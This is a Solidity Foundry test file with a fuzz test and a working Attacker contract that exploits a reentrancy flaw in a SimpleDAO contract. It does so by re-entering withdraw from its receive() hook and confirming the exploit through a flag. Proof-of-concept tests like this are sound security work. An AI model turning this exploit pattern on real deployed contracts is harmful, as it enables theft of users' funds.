
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed other than funding.

        // --- 3. Funding ---
        // Fund the Victim with enough ETH to cover the withdrawals.
        // We fund it with 10x to ensure it has balance.
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract (address(this)) to fund the attacker.
        // We need enough to donate 2 * attackVal to cover the credit for the re-entrant call.
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // We donate 2 * attackVal to establish enough credit for two withdrawals (initial + re-entrant).
        // This ensures the 0.8.x underflow protection doesn't revert the transaction, 
        // allowing us to prove the control flow reentrancy occurred.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Donate the received value to establish credit
        victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Call the vulnerable function
        victim.withdraw(val);

        // Verify Success Conditions
        // If we successfully re-entered, attackCallCount will be incremented in receive()
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Increment before calling to prevent infinite recursion in this test setup
            attackCallCount++;
            
            // Re-enter the contract using the stored Fuzz/Symbolic value
            victim.withdraw(storedVal);
        }
    }
}
